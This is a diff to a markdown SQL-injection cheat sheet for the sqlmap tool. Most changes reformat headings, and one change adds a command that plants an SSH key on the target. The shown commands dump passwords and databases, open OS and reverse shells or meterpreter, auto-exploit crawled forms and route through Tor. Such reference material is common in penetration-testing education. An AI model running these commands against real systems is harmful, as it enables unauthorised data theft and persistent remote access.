@@ -105,27 +105,27 @@ transformed into U+0027 APOSTROPHE (')
 
 ## SQL injection using SQLmap
 
-Basic arguments for SQLmap
+### Basic arguments for SQLmap
 
 ```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
 
-Custom injection in UserAgent/Header/Referer/Cookie
+### Custom injection in UserAgent/Header/Referer/Cookie
 
 ```powershell
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
 The injection is located at the '*'
 ```
 
-Second order injection
+### Second order injection
 
 ```powershell
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
-Shell
+### Shell
 
 ```powershell
 SQL Shell
@@ -136,9 +136,12 @@ python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
 
 Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
+
+SSH Shell by dropping an SSH key
+python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
 ```
 
-Crawl a website with SQLmap and auto-exploit
+### Crawl a website with SQLmap and auto-exploit
 
 ```powershell
 sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
@@ -148,25 +151,25 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 --forms = Parse and test forms
 ```
 
-Using TOR with SQLmap
+### Using TOR with SQLmap
 
 ```powershell
 sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
 ```
 
-Using Chrome cookie and a Proxy
+### Using Chrome cookie and a Proxy
 
 ```powershell
 sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
 ```
 
-Using suffix to tamper the injection
+### Using suffix to tamper the injection
 
 ```powershell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
-General tamper option and tamper's list
+### General tamper option and tamper's list
 
 ```powershell
 tamper=name_of_the_tamper
